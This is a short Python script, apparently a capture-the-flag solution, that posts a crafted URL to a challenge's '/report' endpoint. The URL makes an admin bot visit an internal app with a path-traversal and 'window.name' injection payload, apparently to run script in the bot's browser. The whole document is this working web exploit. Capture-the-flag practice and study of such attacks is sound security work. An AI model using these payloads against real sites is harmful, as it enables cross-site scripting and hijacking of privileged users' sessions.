import requests

URL = 'http://playground.tcp1p.team:39046'
payload = '/a/g;window.name//a%2f..%2f..%2f..%2findex.html'
bot = '/report'
data = {'url':f'http://app:3000{payload}'}
response = requests.post(URL+bot, data=data)
print(data)
print(response.text)

